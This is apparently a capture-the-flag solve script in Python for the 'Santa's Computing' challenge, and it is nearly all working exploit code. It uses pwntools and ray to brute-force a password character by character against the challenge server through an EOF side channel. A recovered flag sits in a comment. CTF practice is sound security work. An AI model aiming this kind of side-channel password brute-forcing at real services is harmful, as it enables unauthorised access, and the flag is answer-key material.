# Santa's Computing (Hardware? 388, 50 solves)
# First blood :p

from pwn import *
from collections import defaultdict
import string
import ray
ray.init()

# Abuse the weird side channel where we get an EOFerror on a correct substring...
@ray.remote
def checkSubstring(test):
    count = 0
    bcount = 0
    while True:
        try:
            if bcount > 4: return test[-1], False
            r = remote('challs.xmas.htsp.ro', 5051)
            r.recvuntil("PASSWORD:\n")
            r.sendline(test)
            r.recvuntil("REJECTED.")
            return test[-1], False
        except EOFError:
            # We could require multiple trials here, but it's not needed
            return test[-1], True
        except PwnlibException:
            bcount += 1
            continue

# known = "X-MAS{S1D3CH4NN3LZ?wtf!!}"
known = "" # Use this if you know any part of the string

log.info("Starting. Beware lots of error spam from ray!")

while True:
    log.success("Current flag: " + known)
    gets = []
    # Order these such that the characters we expect are first
    main = "0123456789-}" + string.ascii_uppercase + string.ascii_lowercase + string.punctuation
    for i in main + "".join(set(string.printable)-set(main)-set("\n")):
        gets.append(checkSubstring.remote(known+i))
    total = len(gets)
    # Get as results come, break on first True
    fl = []
    p = log.progress("Testing characters")
    p.status("Remaining %d/%d" % (total, total))
    while True:
        ready = ray.wait(gets)[0]
        res = ray.get(ready)
        for o in ready: gets.remove(o)
        p.status("Remaining %d/%d" % (len(gets), total))
        fl += list(filter(lambda x: x[1] == True, res))
        if len(fl) > 0:
            break
        if len(gets) <= 1: break
    p.success("Done")
    for o in gets: ray.cancel(o, force=True)
    if len(fl) != 1:
        log.warning("Looks like the server is acting up.")
        log.warning("Try check.py, and if it fails, remove the last character.")
        log.warning("Otherwise, try again in a bit!")
        exit()

    i = fl[0][0]
    known += i
    if known[-1] == "}": break

log.success("Flag: " + known)
# Time to solve from nothing: 
